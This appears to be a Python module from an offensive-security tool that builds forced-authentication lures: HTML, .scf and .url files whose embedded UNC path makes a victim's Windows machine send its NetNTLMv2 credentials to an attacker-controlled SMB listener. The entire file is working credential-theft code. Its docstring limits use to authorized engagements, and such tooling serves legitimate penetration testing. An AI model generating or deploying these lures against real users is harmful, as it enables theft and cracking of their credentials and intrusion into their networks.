r"""Forced-authentication trigger-link generator (Phase 2 of docs/NETNTLM.md).

Generates a small artifact containing a UNC path (`\\<us>\share\file`) that, when the
victim opens or renders it, coerces their machine into an SMB authentication back to us.
The resulting NetNTLMv2 auth is captured by the *same* Responder listener the `poison`
command already runs and flows through the identical parse -> findings -> crack pipeline;
this module only builds the lure.

Pure string generation — no network, no subprocess, no external tool — so it unit-tests
with nothing installed. The target file need not exist and the extension is cosmetic: it
is the victim's SMB *connection attempt* that leaks the hash, not any file transfer.

Legal/ethics: the artifact coerces a real user's credentials. Generate and deploy only
within an authorized, in-scope engagement (see the banner on `redness trigger`).
"""
from __future__ import annotations

from typing import Callable


def unc_path(host: str, share: str = "share", filename: str = "x.jpg") -> str:
    r"""Build a Windows UNC path: `\\host\share\filename` (backslashes hardcoded).

    Generation runs on any OS, so we never use os.sep — the path must be Windows-style
    regardless of where REDNESS is running.
    """
    host = host.strip()
    return f"\\\\{host}\\{share}\\{filename}"


# --------------------------------------------------------------------------- #
# Per-format builders (each takes a prebuilt UNC string; independently testable)
# --------------------------------------------------------------------------- #
def html_img(unc: str) -> str:
    """Minimal, directly-openable HTML embedding a remote `<img>` on the UNC path."""
    return (
        "<!doctype html>\n"
        "<html>\n"
        "  <body>\n"
        f'    <img src="{unc}" width="1" height="1" alt="">\n'
        "  </body>\n"
        "</html>\n"
    )


def scf_file(unc: str) -> str:
    """Windows Explorer `.scf` — resolves `IconFile` on folder view, triggering auth."""
    return (
        "[Shell]\n"
        "Command=2\n"
        "IconFile=" + unc + "\n"
        "[Taskbar]\n"
        "Command=ToggleDesktop\n"
    )


def url_file(unc: str) -> str:
    """Windows `.url` internet shortcut — resolves `IconFile` on the UNC path."""
    return (
        "[InternetShortcut]\n"
        "URL=http://localhost/\n"
        "IconIndex=0\n"
        "IconFile=" + unc + "\n"
    )


# name -> (builder, default file extension). The CLI (step 2) reuses this for dispatch
# and for the default --out filename.
FORMATS: dict[str, tuple[Callable[[str], str], str]] = {
    "html": (html_img, ".html"),
    "scf": (scf_file, ".scf"),
    "url": (url_file, ".url"),
}


def generate(fmt: str, host: str, *, share: str = "share", filename: str = "x.jpg") -> str:
    """Build the trigger artifact for `fmt`. Raises ValueError on an unknown format."""
    try:
        builder, _ext = FORMATS[fmt]
    except KeyError:
        raise ValueError(f"unknown trigger format {fmt!r}; choose from {sorted(FORMATS)}")
    return builder(unc_path(host, share, filename))
